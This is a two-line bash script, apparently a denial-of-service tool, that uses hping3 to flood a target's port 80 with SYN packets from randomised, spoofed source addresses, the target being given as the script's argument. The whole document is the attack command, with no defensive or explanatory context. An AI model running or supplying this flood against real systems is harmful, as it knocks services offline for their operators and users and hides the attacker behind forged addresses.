#!/bin/bash
hping3 --flood -S -p 80 -d 1460 --rand-source '$1'
